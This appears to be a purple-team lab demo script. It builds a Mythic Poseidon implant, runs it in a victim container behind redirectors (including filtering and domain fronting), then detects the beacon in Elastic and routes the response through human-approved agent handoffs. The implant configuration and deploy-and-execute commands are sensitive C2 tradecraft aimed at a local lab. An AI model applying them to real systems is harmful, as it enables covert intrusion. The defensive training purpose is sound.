#!/usr/bin/env python3
"""NightAgents live demo driver.

Runs the full purple-team loop against the local lab:

  red side    Mythic builds a Poseidon payload -> victim container executes it
              -> implant beacons through a redirector fleet (4 techniques)
  blue side   redirector access logs -> Elastic (third-party monitoring)
              -> detector fingerprints the beacon -> signed alert webhook
              -> NightWatcher investigates (Elastic + real Mythic MCP)
              -> operator approves -> NightRouter migrates the route
              -> Safety Kernel verifies continuity, rolls back when unproven

Teaching narrative is printed per stage. Stdlib only. Run from the repo root:

    python demo/scripts/run_demo.py
"""

import argparse
import hashlib
import hmac
import json
import shutil
import subprocess
import sys
import time
import urllib.error
import urllib.request
import uuid
from datetime import UTC, datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import mythic_api  # noqa: E402

REPO_ROOT = Path(__file__).resolve().parents[2]
DEMO_DIR = REPO_ROOT / "demo"
WORK_DIR = DEMO_DIR / "work"
ARTIFACTS_DIR = DEMO_DIR / "artifacts"
ARTIFACT_PAYLOAD = ARTIFACTS_DIR / "poseidon-demo"
DEMO_COMPOSE = DEMO_DIR / "docker-compose.demo.yml"
ENV_FILE = REPO_ROOT / ".env"

API = "http://127.0.0.1:8000"
ELASTIC = "http://127.0.0.1:9200"
OPERATION = "Operation Chimera"
DATA_STREAM = "logs-redirector-demo"
ALERT_INDEX = ".alerts-security.alerts-demo"
OPERATOR = "development-operator"

IMPLANT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) NightAgentsDemo"
C2_URIS = ["/index", "/data"]


def narrate(text: str) -> None:
    print(f"\n{'=' * 78}\n  {text}\n{'=' * 78}", flush=True)


def step(text: str) -> None:
    print(f"  -> {text}", flush=True)


def fail(text: str) -> None:
    print(f"\nDEMO FAILED: {text}", file=sys.stderr)
    sys.exit(1)


def request(method: str, url: str, body: dict | None = None, headers: dict | None = None) -> tuple[int, dict]:
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with urllib.request.urlopen(req, timeout=180) as response:
            return response.status, json.loads(response.read() or b"{}")
    except urllib.error.HTTPError as exc:
        raw = exc.read() or b"{}"
        try:
            return exc.code, json.loads(raw)
        except json.JSONDecodeError:
            return exc.code, {"raw": raw.decode(errors="replace")}


def sh(*args: str, check: bool = True) -> subprocess.CompletedProcess:
    result = subprocess.run(args, capture_output=True, text=True, cwd=REPO_ROOT)
    if check and result.returncode != 0:
        fail(f"command {' '.join(args)} failed:\n{result.stdout}\n{result.stderr}")
    return result


def load_env() -> dict[str, str]:
    values = {}
    for line in ENV_FILE.read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            key, _, value = line.partition("=")
            values[key.strip()] = value.strip().strip('"')
    return values


def mythic_admin_credentials() -> tuple[str, str]:
    """Read the lab Mythic admin credentials from the local install's .env."""
    install_env = Path.home() / "mythic-install" / ".env"
    if not install_env.exists():
        fail(f"mythic install env not found at {install_env}; set MYTHIC_ADMIN_USER/PASSWORD")
    values = {}
    for line in install_env.read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            key, _, value = line.partition("=")
            values[key.strip()] = value.strip().strip('"')
    return values.get("MYTHIC_ADMIN_USER", "mythic_admin"), values["MYTHIC_ADMIN_PASSWORD"]


def patch_env(updates: dict[str, str]) -> None:
    lines = ENV_FILE.read_text().splitlines()
    seen = set()
    output = []
    for line in lines:
        key = line.partition("=")[0].strip()
        if key in updates:
            output.append(f"{key}={updates[key]}")
            seen.add(key)
        else:
            output.append(line)
    for key, value in updates.items():
        if key not in seen:
            output.append(f"{key}={value}")
    ENV_FILE.write_text("\n".join(output) + "\n")


def sign(secret: str, timestamp: str, nonce: str, body: bytes) -> str:
    message = timestamp.encode() + b"." + nonce.encode() + b"." + body
    return "sha256=" + hmac.new(secret.encode(), message, hashlib.sha256).hexdigest()


def post_signed_webhook(secret: str, body: bytes) -> tuple[int, dict]:
    timestamp = str(int(time.time()))
    nonce = f"demo-{uuid.uuid4().hex}"
    req = urllib.request.Request(f"{API}/api/v2/webhooks/elastic/incidents", data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-NightAgents-Timestamp", timestamp)
    req.add_header("X-NightAgents-Nonce", nonce)
    req.add_header("X-NightAgents-Signature", sign(secret, timestamp, nonce, body))
    try:
        with urllib.request.urlopen(req, timeout=30) as response:
            return response.status, json.loads(response.read() or b"{}")
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read() or b"{}")


# --------------------------------------------------------------------------
# Stage 0: preflight
# --------------------------------------------------------------------------

def stage_preflight() -> str:
    narrate(
        "STAGE 0 - PREFLIGHT\n"
        "Blue-team cycle starts with trustworthy tooling: verify Elastic, the\n"
        "NightAgents control plane, and the Mythic lab, then point the\n"
        "NightAgents Mythic MCP server at the real Mythic instance."
    )
    _, health = request("GET", f"{ELASTIC}/_cluster/health")
    if health.get("status") not in {"green", "yellow"}:
        fail("elasticsearch is not healthy")
    step("elasticsearch healthy")

    status, _ = request("GET", f"{API}/health")
    if status != 200:
        fail("nightagents api is not running (docker compose up -d)")
    step("nightagents api healthy")

    user, password = mythic_admin_credentials()
    jwt = mythic_api.login(user, password)
    step("mythic login ok")
    apitoken = mythic_api.generate_apitoken(jwt, f"nightagents-demo-{uuid.uuid4().hex[:6]}")
    step("fresh mythic api token generated")

    patch_env(
        {
            "NIGHTAGENTS_MYTHIC_URL": "https://host.docker.internal:7443",
            "NIGHTAGENTS_MYTHIC_API_KEY": apitoken,
            "NIGHTAGENTS_MYTHIC_VERIFY_TLS": "false",
        }
    )
    sh("docker", "compose", "--env-file", ".env", "up", "-d", "--force-recreate", "mythic-mcp")
    time.sleep(8)
    for _ in range(10):
        _, mcp = request("GET", f"{API}/api/v2/operations/mcp-health")
        if mcp.get("health_check", {}).get("mythic", {}).get("healthy"):
            step("nightagents mythic-mcp connected to the real mythic instance")
            return apitoken
        time.sleep(4)
    fail("mythic-mcp did not become healthy against the real mythic")


def preflight_blue() -> None:
    """Lightweight preflight for the blue-only scenario: no Mythic login, no
    token minting, no .env rewriting - the range owner already provisioned
    all of that with --setup-only (see demo/scripts/lab_provision.sh)."""
    narrate(
        "PREFLIGHT - BLUE SCENARIO\n"
        "Verifying the provisioned lab: Elastic, the NightAgents control\n"
        "plane, the Mythic MCP link, the redirector fleet and the implant\n"
        "artifact. Candidates never touch Mythic directly."
    )
    _, health = request("GET", f"{ELASTIC}/_cluster/health")
    if health.get("status") not in {"green", "yellow"}:
        fail("elasticsearch is not healthy")
    step("elasticsearch healthy")
    status, _ = request("GET", f"{API}/health")
    if status != 200:
        fail("nightagents api is not running (docker compose up -d)")
    step("nightagents api healthy")
    _, mcp = request("GET", f"{API}/api/v2/operations/mcp-health")
    if not mcp.get("health_check", {}).get("mythic", {}).get("healthy"):
        fail("mythic-mcp is not healthy; the range owner must run demo/scripts/lab_provision.sh first")
    step("nightagents mythic-mcp link healthy")
    if not ARTIFACT_PAYLOAD.exists():
        fail(f"payload artifact missing at {ARTIFACT_PAYLOAD}; run demo/scripts/lab_provision.sh first")
    step(f"payload artifact present: {ARTIFACT_PAYLOAD}")


# --------------------------------------------------------------------------
# Stage 1: build the implant
# --------------------------------------------------------------------------

def stage_payload(jwt: str, apitoken: str, use_cache: bool = False) -> Path:
    narrate(
        "STAGE 1 - RED: BUILD THE IMPLANT\n"
        "Mythic builds a Poseidon payload configured to beacon through the\n"
        "pass-through redirector (technique 1). The implant never learns the\n"
        "real C2 address - that is the whole point of redirection."
    )
    if use_cache and ARTIFACT_PAYLOAD.exists():
        step(f"reusing cached payload artifact: {ARTIFACT_PAYLOAD}")
        return ARTIFACT_PAYLOAD
    definition = {
        "description": "NightAgents red team village demo payload",
        "payload_type": "poseidon",
        "selected_os": "Linux",
        "filename": "poseidon-demo",
        "c2_profiles": [
            {
                "c2_profile": "http",
                "c2_profile_is_p2p": False,
                "c2_profile_parameters": {
                    "callback_host": "http://redirector-pass.demo",
                    "callback_port": 8080,
                    "callback_interval": 10,
                    "callback_jitter": 10,
                    "killdate": "365",
                    "encrypted_exchange_check": True,
                    "AESPSK": "aes256_hmac",
                    "get_uri": "index",
                    "post_uri": "data",
                    "query_path_name": "q",
                    "headers": {"User-Agent": IMPLANT_UA},
                },
            }
        ],
        "build_parameters": [
            {"name": "mode", "value": "default"},
            {"name": "architecture", "value": "AMD_x64"},
            {"name": "egress_order", "value": ["http"]},
            {"name": "egress_failover", "value": "failover"},
            {"name": "failover_threshold", "value": 10},
            {"name": "garble", "value": False},
            {"name": "debug", "value": False},
            {"name": "static", "value": False},
            {"name": "proxy_bypass", "value": False},
        ],
    }
    payload_uuid = mythic_api.create_payload(jwt, definition)
    step(f"payload registered: {payload_uuid}; waiting for build")
    file_id = mythic_api.wait_for_payload(apitoken, payload_uuid)
    binary = mythic_api.download_payload(apitoken, file_id)
    WORK_DIR.mkdir(parents=True, exist_ok=True)
    ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)
    target = WORK_DIR / "poseidon-demo"
    target.write_bytes(binary)
    target.chmod(0o755)
    shutil.copy2(target, ARTIFACT_PAYLOAD)
    ARTIFACT_PAYLOAD.chmod(0o755)
    step(f"payload downloaded: {target} ({len(binary)} bytes), cached at {ARTIFACT_PAYLOAD}")
    return target


# --------------------------------------------------------------------------
# Stage 2: redirector fleet + victim execution
# --------------------------------------------------------------------------

def implant_running() -> bool:
    result = sh(
        "docker", "compose", "-f", str(DEMO_COMPOSE), "exec", "-T", "victim",
        "sh", "-c", "for p in /proc/[0-9]*/comm; do cat $p 2>/dev/null; done",
        check=False,
    )
    return "poseidon-demo" in result.stdout


def ensure_fleet_and_implant(payload: Path) -> None:
    sh("docker", "compose", "-f", str(DEMO_COMPOSE), "up", "-d")
    step("redirector fleet and victim container started")
    if implant_running():
        step("implant already running on the victim; reusing it")
        return
    sh("docker", "compose", "-f", str(DEMO_COMPOSE), "cp", str(payload), "victim:/payload/poseidon-demo")
    sh(
        "docker", "compose", "-f", str(DEMO_COMPOSE), "exec", "-d", "victim",
        "sh", "-c", "chmod +x /payload/poseidon-demo && nohup /payload/poseidon-demo >/payload/agent.log 2>&1 &",
    )
    step("implant executed on the victim container")


def wait_for_callback(apitoken: str) -> None:
    step("waiting for the live callback in mythic")
    deadline = time.time() + 180
    while time.time() < deadline:
        callbacks = mythic_api.list_callbacks(apitoken, OPERATION)
        live = [cb for cb in callbacks if cb.get("active") and not cb.get("dead")]
        if live:
            step(f"live callback in mythic: id={live[0]['agent_callback_id']} host={live[0].get('host')}")
            return
        time.sleep(5)
    fail("no live callback appeared in mythic within 180s")


def stage_execute(payload: Path, apitoken: str) -> None:
    narrate(
        "STAGE 2 - RED: REDIRECTOR FLEET + EXECUTION\n"
        "Four redirectors come up, each demonstrating a technique:\n"
        "  1. pass       - plain reverse proxy\n"
        "  2. filter     - only implant-shaped traffic reaches C2, decoy else\n"
        "  3. front      - one IP, two vhosts; hidden Host header fronts the C2\n"
        "  4. ab         - one domain serves content AND c2 on separate paths\n"
        "The victim container executes the implant through redirector 1."
    )
    ensure_fleet_and_implant(payload)
    wait_for_callback(apitoken)


# --------------------------------------------------------------------------
# Stage 3: engagement + telemetry
# --------------------------------------------------------------------------

def stage_telemetry(env: dict[str, str]) -> dict:
    narrate(
        "STAGE 3 - BLUE: THIRD-PARTY MONITORING\n"
        "Defenders rarely see the implant. They see infrastructure telemetry:\n"
        "redirector/proxy access logs shipped to Elastic. The shipper tags\n"
        "every request with the NightAgents engagement so investigations can\n"
        "scope evidence correctly."
    )
    _, engagement = request("POST", f"{API}/api/v2/engagements", {"name": OPERATION})
    engagement_id = engagement["engagement_id"]
    step(f"engagement registered: {engagement_id} ({OPERATION})")

    assets = {}
    for label, route in (("burned", "route-demo-live"), ("standby", "route-demo-standby")):
        _, asset = request(
            "POST",
            f"{API}/api/v2/engagements/{engagement_id}/redirectors",
            {
                "redirector_id": f"demo-redirector-{label}",
                "domain": f"{label}.redirector.demo",
                "logical_route_id": route,
                "provider_resource_id": f"demo-{label}-001",
                "mythic_profile": "http",
                "failover_group": "demo",
            },
        )
        request(
            "PUT",
            f"{API}/api/v2/engagements/{engagement_id}/redirectors/demo-redirector-{label}/health",
            {"status": "healthy", "evidence": {"source": "demo"}},
        )
        assets[label] = asset["asset_id"]
    step("redirector assets registered with verified health (burned + standby)")

    request(
        "PUT",
        f"{ELASTIC}/_index_template/{DATA_STREAM}",
        {
            "index_patterns": [f"{DATA_STREAM}*"],
            "data_stream": {},
            "template": {
                "mappings": {
                    "properties": {
                        "@timestamp": {"type": "date"},
                        "host": {"properties": {"name": {"type": "keyword"}}},
                        "nightagents": {
                            "properties": {
                                "engagement_id": {"type": "keyword"},
                                "redirector_id": {"type": "keyword"},
                            }
                        },
                    }
                }
            },
        },
    )
    status, _ = request("PUT", f"{ELASTIC}/_data_stream/{DATA_STREAM}")
    if status not in (200, 201):
        step("data stream already exists; continuing")
    (WORK_DIR / "config.json").write_text(
        json.dumps({"engagement_id": engagement_id, "redirector_asset_id": assets["burned"]})
    )
    step(f"shipper config written; redirector logs now flowing to {DATA_STREAM}")
    wait_for_fresh_telemetry()
    return {"engagement_id": engagement_id, "assets": assets}


def wait_for_fresh_telemetry(max_age_seconds: float = 120, timeout_seconds: float = 300) -> None:
    """Wait until the newest event in the stream is recent. The shipper starts
    tailing only after its config exists, and NightWatcher refuses evidence
    from stale sources - so detection must not start until the feed is live."""
    step("waiting for live telemetry (shipper backfill + fresh beacons)")
    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        _, result = request(
            "GET",
            f"{ELASTIC}/{DATA_STREAM}/_search",
            {"size": 1, "sort": [{"@timestamp": {"order": "desc"}}], "_source": ["@timestamp"]},
        )
        hits = result.get("hits", {}).get("hits", [])
        if hits:
            stamp = datetime.fromisoformat(hits[0]["_source"]["@timestamp"].replace("Z", "+00:00"))
            age = (datetime.now(UTC) - stamp).total_seconds()
            if age <= max_age_seconds:
                step(f"telemetry live (newest event {age:.0f}s old)")
                return
        time.sleep(5)
    fail(f"no fresh telemetry in {DATA_STREAM} within {timeout_seconds}s")


# --------------------------------------------------------------------------
# Stage 4: detection - fingerprint the beacon
# --------------------------------------------------------------------------

def stage_detection(context: dict, env: dict[str, str]) -> str:
    narrate(
        "STAGE 4 - BLUE: DISCOVERY + FINGERPRINTING\n"
        "The detector watches third-party telemetry for beacon behavior:\n"
        "periodic requests from one client to the same two URIs with a fixed\n"
        "user agent. That rhythm - not any single request - is the fingerprint."
    )
    beacon_docs = []
    deadline = time.time() + 240
    while time.time() < deadline:
        _, result = request(
            "GET",
            f"{ELASTIC}/{DATA_STREAM}/_search",
            {
                "size": 100,
                "sort": [{"@timestamp": {"order": "desc"}}],
                "query": {"terms": {"url.path": C2_URIS}},
            },
        )
        # newest first -> reverse so interval math walks forward in time
        beacon_docs = [hit["_source"] for hit in result.get("hits", {}).get("hits", [])][::-1]
        if len(beacon_docs) >= 4:
            break
        time.sleep(5)
    if len(beacon_docs) < 4:
        fail(f"expected beacon telemetry in elastic, found {len(beacon_docs)} events")

    gets = [doc for doc in beacon_docs if doc["url"]["path"] == "/index"]
    intervals = []
    stamps = [datetime.fromisoformat(doc["@timestamp"].replace("Z", "+00:00")) for doc in gets]
    for earlier, later in zip(stamps, stamps[1:], strict=False):
        intervals.append(round((later - earlier).total_seconds(), 1))
    victim_ip = beacon_docs[0]["source"]["ip"]
    fingerprint = {
        "victim_ip": victim_ip,
        "uris": sorted({doc["url"]["path"] for doc in beacon_docs}),
        "user_agent": beacon_docs[0]["user_agent"]["original"],
        "checkin_intervals_seconds": intervals,
        "request_count": len(beacon_docs),
    }
    step(f"beacon fingerprint: {json.dumps(fingerprint)}")

    alert_id = f"demo-beacon-{uuid.uuid4().hex[:8]}"
    now = datetime.now(UTC).isoformat()
    # Recreate the alert index with an explicit keyword mapping: the adapter
    # filters incidents by term on nightagents.engagement_id, which silently
    # matches nothing when dynamic mapping stores it as analyzed text.
    request("DELETE", f"{ELASTIC}/{ALERT_INDEX}")
    request(
        "PUT",
        f"{ELASTIC}/{ALERT_INDEX}",
        {"mappings": {"properties": {"nightagents": {"properties": {"engagement_id": {"type": "keyword"}}}}}},
    )
    request(
        "PUT",
        f"{ELASTIC}/{ALERT_INDEX}/_doc/{alert_id}?refresh=true",
        {
            "@timestamp": now,
            "nightagents": {"engagement_id": context["engagement_id"]},
            "kibana": {"alert": {"rule": {"name": "demo-c2-beacon-fingerprint"}}},
            "event": {"action": "detection", "category": "intrusion_detection"},
            "demo": {"fingerprint": fingerprint},
        },
    )

    webhook_body = json.dumps(
        {
            "schema_version": "1.0",
            "external_alert_id": alert_id,
            "engagement_id": context["engagement_id"],
            "redirector_asset_id": context["assets"]["burned"],
            "severity": "high",
            "rule_id": "demo-c2-beacon-fingerprint",
            "summary": f"Beaconing pattern through burned redirector from {victim_ip}",
            "evidence_refs": [f"elastic:{DATA_STREAM}"],
            "source_health": {DATA_STREAM: {}},
            "occurred_at": now,
        }
    ).encode()
    status, accepted = post_signed_webhook(env["NIGHTAGENTS_ELASTIC_WEBHOOK_SECRET"], webhook_body)
    if status != 202:
        fail(f"webhook rejected: {status} {accepted}")
    step(f"signed incident webhook accepted, incident={accepted['incident_id']}")
    return accepted["incident_id"]


# --------------------------------------------------------------------------
# Stage 5: response - investigate, decide, act
# --------------------------------------------------------------------------

def stage_response(context: dict, incident_id: str, auto_approve: bool) -> None:
    narrate(
        "STAGE 5 - BLUE: VALIDATE -> ASSESS -> DECIDE -> ACT\n"
        "NightWatcher now verifies evidence-source health, pulls the elastic\n"
        "evidence, and checks the live callback inventory in the REAL Mythic\n"
        "through MCP. Only then does it produce a signed handoff. A human\n"
        "approves. NightRouter plans the migration from the burned redirector\n"
        "to the standby, executes through the Safety Kernel, and verifies\n"
        "callback continuity. Unknown continuity = automatic rollback."
    )
    handoff = {}
    for attempt in (1, 2):
        status, handoff = request("POST", f"{API}/api/v2/incidents/{incident_id}/investigate")
        if status != 200:
            fail(f"investigation failed: {status} {handoff}")
        if handoff.get("handoff_id"):
            break
        # Model-driven critics have run-to-run variance; abstention is safe-neutral,
        # so one retry is legitimate before giving up on the incident.
        if attempt == 1 and handoff.get("disposition") == "abstain":
            claims = handoff.get("critique", {}).get("unsupported_claims")
            step(f"investigation abstained (critic variance); retrying once: {claims}")
            continue
        break
    handoff_id = handoff.get("handoff_id")
    if not handoff_id:
        fail(f"investigation did not produce a handoff: {handoff}")
    step(f"investigation complete; signed handoff {handoff_id} (disposition={handoff.get('disposition')})")
    step(f"prediction: {handoff.get('prediction', {}).get('event')} "
         f"p={handoff.get('prediction', {}).get('probability')} phase={handoff.get('phase')}")

    if auto_approve:
        status, approval = request("POST", f"{API}/api/v2/handoffs/{handoff_id}/approve", {"operator_id": OPERATOR})
        if status != 200:
            fail(f"approval failed: {status} {approval}")
        step("operator approved the handoff (auto-approve test mode)")
    else:
        step("WAITING FOR OPERATOR DECISION - approve or reject in Slack (button click)")
        step("     (the platform will not proceed without a human; this is the point)")
        deadline = time.time() + 900
        approved = False
        while time.time() < deadline:
            try:
                status, state = request("GET", f"{API}/api/v2/handoffs/{handoff_id}")
            except urllib.error.URLError:
                time.sleep(5)  # API may be restarting; keep waiting for the operator
                continue
            if status == 200 and state.get("status") == "approved":
                step("operator APPROVED the handoff via Slack")
                approved = True
                break
            if status == 200 and state.get("status") == "rejected":
                step("operator REJECTED the handoff via Slack - respecting the decision; no execution")
                context["execution_state"] = "rejected_by_operator"
                return
            time.sleep(5)
        if not approved:
            fail("no operator decision within 15 minutes")

    status, execution = request(
        "POST",
        f"{API}/api/v2/handoffs/{handoff_id}/execute",
        {
            "logical_route_id": "route-demo-live",
            "old_redirector_id": "demo-redirector-burned",
            "new_redirector_id": "demo-redirector-standby",
        },
    )
    if status != 200:
        fail(f"execution failed: {status} {execution}")
    state = execution.get("state")
    step(f"execution finished with state={state}")
    if state == "rolled_back":
        step(
            "kernel verdict: Mythic callbacks cannot prove which redirector carried them,\n"
            "     so continuity is UNKNOWN and the route switch was rolled back safely.\n"
            "     The platform never reports success without independent proof."
        )
    context["execution_state"] = state


# --------------------------------------------------------------------------
# Stage 6: report
# --------------------------------------------------------------------------

def stage_report(context: dict) -> None:
    narrate("STAGE 6 - BLUE: EVIDENCE TRAIL")
    _, audit = request("GET", f"{API}/api/v2/audit/verify")
    step(f"audit chain valid={audit.get('valid')} events={audit.get('events')}")
    _, calibration = request(
        "GET", f"{API}/api/v2/engagements/{context['engagement_id']}/prediction-calibration"
    )
    step(f"calibration buckets: {len(calibration.get('buckets', []))} (warnings: {calibration.get('warnings')})")
    _, summary = request("GET", f"{API}/api/v2/operations/summary")
    step(f"operations summary: {json.dumps(summary)[:200]}")
    narrate(
        "DEMO COMPLETE\n"
        "discovery -> fingerprinting -> validation -> assessment -> decision ->\n"
        "action -> verification. Every step is on the audit chain."
    )


def run_blue_scenario(env: dict[str, str], auto_approve: bool) -> None:
    context = stage_telemetry(env)
    incident_id = stage_detection(context, env)
    stage_response(context, incident_id, auto_approve)
    stage_report(context)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="NightAgents live demo driver. Default: full red+blue run. "
        "--setup-only: provision the lab (payload + fleet + implant) once, as the range owner. "
        "--blue-only: run only the blue-team scenario against the provisioned lab. "
        "Approval requires an operator decision in Slack unless --auto-approve is given."
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--setup-only", action="store_true", help="provision the lab, then stop")
    mode.add_argument("--blue-only", action="store_true", help="blue-team scenario only (provisioned lab required)")
    parser.add_argument(
        "--auto-approve",
        action="store_true",
        help="test mode: approve handoffs programmatically instead of waiting for the operator in Slack",
    )
    args = parser.parse_args()

    if args.blue_only:
        preflight_blue()
        ensure_fleet_and_implant(ARTIFACT_PAYLOAD)
        run_blue_scenario(load_env(), args.auto_approve)
        return

    apitoken = stage_preflight()
    env = load_env()
    user, password = mythic_admin_credentials()
    jwt = mythic_api.login(user, password)
    payload = stage_payload(jwt, apitoken, use_cache=args.setup_only)
    stage_execute(payload, apitoken)
    if args.setup_only:
        narrate(
            "LAB PROVISIONED\n"
            "The payload artifact is cached in demo/artifacts/, the redirector\n"
            "fleet is up and the implant is beaconing. Candidates can now run:\n"
            "  python demo/scripts/run_demo.py --blue-only"
        )
        return
    run_blue_scenario(env, args.auto_approve)


if __name__ == "__main__":
    main()
